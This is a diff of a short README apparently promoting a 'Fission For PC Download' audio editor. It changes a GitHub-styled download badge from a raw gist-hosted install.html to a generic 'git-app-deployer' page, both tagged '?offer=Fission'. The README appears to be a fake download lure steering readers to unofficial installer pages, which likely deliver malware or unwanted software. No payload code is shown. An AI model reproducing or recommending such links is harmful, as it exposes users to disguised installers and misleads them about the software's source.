@@ -1,6 +1,6 @@
 # Fission For PC Download — Desktop Audio Editor 
 
-[![Get Fission GitHub](https://img.shields.io/badge/Get%20Fission%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/aknelnewton64/ce53bba7d72575ce3a3fcd922f37e612/raw/ad3b03ff202011fcea219b75e4e13efa8c44873c/install.html?offer=Fission)
+[![Get Fission GitHub](https://img.shields.io/badge/Get%20Fission%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=Fission)
 
 ---
 
